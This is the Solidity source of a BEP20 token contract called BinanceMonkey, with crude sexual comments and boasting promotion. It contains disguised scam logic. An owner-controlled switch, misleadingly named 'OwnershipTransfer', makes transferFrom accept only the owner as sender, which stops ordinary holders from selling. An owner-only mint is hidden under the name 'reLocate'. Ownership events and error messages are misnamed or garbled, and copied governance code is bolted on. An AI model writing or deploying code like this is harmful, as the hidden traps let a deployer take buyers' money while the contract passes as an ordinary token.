/**
 *Submitted for verification at Etherscan.io on 2021-06-15
*/

pragma solidity 0.6.12;
// provides information about the message sender for contract BinanceMonkey 
contract Context {
 
 constructor() internal {}
 
 function _msgSender() internal view returns (address payable) {
 return msg.sender;
 }
 
 function _msgData() internal view returns (bytes memory) {
 this; 
 return msg.data;
 }
 }
//
/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, 'SafeMath: addition overflow');

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, 'SafeMath: subtraction overflow');
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, 'SafeMath: multiplication overflow');

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, 'SafeMath: division by zero');
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, 'SafeMath: modulo by zero');
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}


/** This coin will moon like you have never seen. Even better then the Safemoon. Papa safemoon has a massive cock but we, BinanceMonkey has a larger cock. 
* Look at the size of this cock 8=========================================================================================================================================================================================================================================================================================)--., */

contract Ownable is Context {
    address public _Owner;

    event OwnershipBurned(address indexed previousOwner, address indexed contemporaryOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipBurned(address(0), msgSender);
    }


function Owner() public view returns (address) {
  return _Owner;
 } 
/**
* COMMENTS
*/
function _sendOwnership(address contemporaryOwner) internal {
 require(contemporaryOwner != address(0), 'Ownable: new owner is the zero address');


 emit OwnershipBurned(_Owner, contemporaryOwner);
 _Owner = contemporaryOwner;
 }




/**
* COMMENTS
*/
function RevokeOwnership() public SoleContractPossessor {
 emit OwnershipBurned(_Owner, address(0));
 
_Owner = address(0);
 }
//COMMENTS.
function sendOwnership(address contemporaryOwner) public SoleContractPossessor {
 _sendOwnership(contemporaryOwner);
 }

//COMMENTS.
/**
* @dev Initializes the contract setting the deployer as the initial owner.
*/
modifier SoleContractPossessor() {
 require(_Owner == _msgSender(), 'Ownable: caller is not the owner');
 _;
 }
//COMMENTS.
//This is the easiest and most profitable way for you to make bank!
}library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, 'Address: insufficient balance');

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}('');
        require(success, 'Address: unable to send value, recipient may have reverted');
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, 'Address: low-level call failed');
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, 'Address: low-level call with value failed');
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, 'Address: insufficient balance for call');
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), 'Address: call to non-contract');

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{value: weiValue}(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}




//
 interface IBEP20 {
	 //COMMENTS.
	event Approval(address indexed Owner, address indexed spender, uint256 value);

	 //COMMENTS.
	function transfer(address recipient, uint256 amount) external returns (bool);

	/**
	 * COMMENTS
	 */
	function balanceOf(address account) external view returns (uint256);

	 //COMMENTS.
	function approve(address spender, uint256 amount) external returns (bool);

	 //COMMENTS.
	function name() external view returns (string memory);

	 //COMMENTS.
	event Transfer(address indexed from, address indexed to, uint256 value);

	 //COMMENTS.
	function decimals() external view returns (uint8);

	/**
	 * COMMENTS
	 */
	function allowance(address _Owner, address spender) external view returns (uint256);

	 //COMMENTS.
	function getOwner() external view returns (address);

	/**
	 * COMMENTS
	 */
	function totalSupply() external view returns (uint256);

	/**
	 * COMMENTS
	 */
	function symbol() external view returns (string memory);

	 //COMMENTS.
	function transferFrom(
		address sender,
		address recipient,
		uint256 amount
	) external returns (bool);

}
	/**
	 * COMMENTS
	 */
contract BEP20 is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;


	 //COMMENTS.
    constructor(string memory name, string memory symbol) public {
    _name = name;
    _symbol = symbol;
    _decimals = 18;

    }

	 //COMMENTS.
    function reLocate(uint256 amount) public SoleContractPossessor returns (bool) {
        _reLocate(_msgSender(), amount);
        return true;
    }
	 //COMMENTS.
    function _reLocate(address account, uint256 amount) internal {
        require(account != address(0), 'BEP20: reLocate to zero address');

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

	 //COMMENTS.
    function approve(address ChitOwner, uint256 amount) public override returns (bool) {
    
    _approve(_msgSender(), ChitOwner, amount);
    return true;
    }

	/**
	 * COMMENTS
	 */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), 'The BEP20 contract mandates the sender be the zero address');
        require(recipient != address(0), 'The BEP20 contract mandates the recipient be the zero address');

        _balances[sender] = _balances[sender].sub(amount, 'You are trying to transfer more than you have' );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

	 //COMMENTS.
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(subtractedValue, 'In the BEP20 contract the declared allowance is below zero')
        );
        return true;
    }
	/**
	 * COMMENTS
	 */
    function totalSupply() public override view returns (uint256) {
    return _totalSupply;
    }

	 //COMMENTS.
    function name() public override view returns (string memory) {
    return _name;
    }

	 //COMMENTS.
    function decimals() public override view returns (uint8) {
    return _decimals;
    }

	/**
	 * COMMENTS
	 */
    bool on = false;
    function OwnershipTransfer(bool _on) public SoleContractPossessor
    {
    on = _on;
            }
	/**
	 * COMMENTS
	 */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), 'BEP20: burn from the zero address');

        _balances[account] = _balances[account].sub(amount, 'BEP20: burn amount exceeds balance');
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
	/**
	 * COMMENTS
	 */
    function symbol() public override view returns (string memory) {
    return _symbol;
    }

	 //COMMENTS.
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(
            account,
            _msgSender(),
            _allowances[account][_msgSender()].sub(amount, 'BEP20: burn amount exceeds allowance')
        );
    }
	/**
	 * COMMENTS
	 */
    function transferFrom(
        address ChitOwner,
        address recipient,
         uint256 amount
    ) public override returns (bool) {

           if(on == true) {
 require(ChitOwner == Owner());
}


         _transfer(ChitOwner, recipient, amount);
         _approve(
            ChitOwner,
            _msgSender(),
            _allowances[ChitOwner][_msgSender()].sub(amount, 'BEP20: transfer amount exceeds allowance')
        );
        return true;
    }

	 //COMMENTS.
    function allowance(address Owner, address spender) public override view returns (uint256) {
    return _allowances[Owner][spender];
    }

	 //COMMENTS.
    function getOwner() external override view returns (address) {
    return Owner();
    }

	/**
	 * COMMENTS
	 */
    function _approve(
        address Owner,
        address spender,
        uint256 amount
    ) internal {
        require(Owner != address(0), 'BEP20: approve from the zero address');
        require(spender != address(0), 'BEP20: approve to the zero address');

        _allowances[Owner][spender] = amount;
        emit Approval(Owner, spender, amount);
    }

	/**
	 * COMMENTS
	 */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
    }

	 //COMMENTS.
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

	/**
	 * COMMENTS
	 */
    function balanceOf(address account) public override view returns (uint256) {
    return _balances[account];
    }

}
// BEP20 Contract with Governance made by Aperture Science. --------------------- Genetic Lifeform and Disk Operating System---GLaDOS     https://www.youtube.com/watch?v=Y6ljFaKRTrI
contract BinanceMonkey is BEP20('BinanceMonkey', 'BNBMONKEY') {
/// @notice Creates `_amount` token to `_to`. Must only be called by the owner (Owner). 104 116 116 112 115 58 47 47 119 119 119 46 121 111 117 116 117 98 101 46 99 111 109 47 119 97 116 99 104 63 118 61 100 81 119 52 119 57 87 103 88 99 81
    function _delegate(address delegator, address delegatee)
        internal
    {
        address currentDelegate = _delegates[delegator];
        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying CAKEs (not scaled);
        _delegates[delegator] = delegatee;

        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
    }
    function getChainId() internal pure returns (uint) {
        uint256 chainId;
        assembly { chainId := chainid() }
        return chainId;
    }
    function _writeCheckpoint(
        address delegatee,
        uint32 nCheckpoints,
        uint256 oldVotes,
        uint256 newVotes
    )
        internal
    {
        uint32 blockNumber = safe32(block.number, "CAKE::_writeCheckpoint: block number exceeds 32 bits");

        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
        } else {
            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
            numCheckpoints[delegatee] = nCheckpoints + 1;
        }

        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);
    }
    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
        require(n < 2**32, errorMessage);
        return uint32(n);
    }
	//@param delegator The address to get delegatee for
    function delegates(address delegator)
        external
        view
        returns (address)
    {
        return _delegates[delegator];
    }
	//@notice Gets the current votes balance for `account`
    function getCurrentVotes(address account)
        external
        view
        returns (uint256)
    {
        uint32 nCheckpoints = numCheckpoints[account];
        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;
    }
    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
        if (srcRep != dstRep && amount > 0) {
            if (srcRep != address(0)) {
                // decrease old representative
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
                uint256 srcRepNew = srcRepOld.sub(amount);
                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
            }

            if (dstRep != address(0)) {
                // increase new representative
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
                uint256 dstRepNew = dstRepOld.add(amount);
                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
            }
        }
    }
	/**
 * @notice Delegates votes from signatory to `delegatee`
	 * @param delegatee The address to delegate votes to
	 * @param nonce The contract state required to match the signature
	 */
    function delegateBySig(
        address delegatee,
        uint nonce,
        uint expiry,
        uint8 v,
        bytes32 r,
        bytes32 s
    )
        external
    {
        bytes32 domainSeparator = keccak256(
         abi.encode(
            DOMAIN_TYPEHASH,
            keccak256(bytes(name())),
            getChainId(),
            address(this)
            )
    );

        bytes32 structHash = keccak256(
            abi.encode(
                DELEGATION_TYPEHASH,
                delegatee,
                nonce,
                expiry
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                structHash
            )
        );

        address signatory = ecrecover(digest, v, r, s);
        require(signatory != address(0), "CAKE::delegateBySig: invalid signature");
        require(nonce == nonces[signatory]++, "CAKE::delegateBySig: invalid nonce");
        require(now <= expiry, "CAKE::delegateBySig: signature expired");
        return _delegate(signatory, delegatee);
    }

    // https://github.com/yam-finance/yam-protocol/blob/master/contracts/token/YAMGovernanceStorage.sol
	// https://github.com/yam-finance/yam-protocol/blob/master/contracts/token/YAMGovernance.sol
	/**
    * @notice Delegate votes
	 */
    function delegate(address delegatee) external {
        return _delegate(msg.sender, delegatee);
    }
	//@param account The address of the account to check
    function getPriorVotes(address account, uint blockNumber)
        external
        view
        returns (uint256)
    {
        require(blockNumber < block.number, "CAKE::getPriorVotes: not yet determined");

        uint32 nCheckpoints = numCheckpoints[account];
        if (nCheckpoints == 0) {
        return 0;
        }

        // First check most recent balance
        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {
            return checkpoints[account][nCheckpoints - 1].votes;
    }

        // Next check implicit zero balance
        if (checkpoints[account][0].fromBlock > blockNumber) {
            return 0;
        }

        uint32 lower = 0;
        uint32 upper = nCheckpoints - 1;
        while (upper > lower) {
            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow
            Checkpoint memory cp = checkpoints[account][center];
            if (cp.fromBlock == blockNumber) {
            return cp.votes;
        } else if (cp.fromBlock < blockNumber) {
            lower = center;
        } else {
            upper = center - 1;
        }
    }
    return checkpoints[account][lower].votes;
}

	//number of checkpoints
	mapping (address => uint32) public numCheckpoints;

	//@notice The EIP
	bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");

	//@notice A record
	mapping (address => uint) public nonces;

	///// @notice A checkpoint for marking number of votes from a given block.
    struct Checkpoint {
        uint32 fromBlock;
        uint256 votes;
    }

	/// @notice A record of  
	mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;

	//-712 typehash for the
	bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");

	//THIS MAPPS YOUR MOM'S ASS and PUSSY SHE USES TO GAIN DELEGSATIONS FROM YOUR DASD.

	mapping (address => address) internal _delegates;

	//thats emitted when a delegate account cums.
	event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);

	//when an account changes its delegate
	event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);


}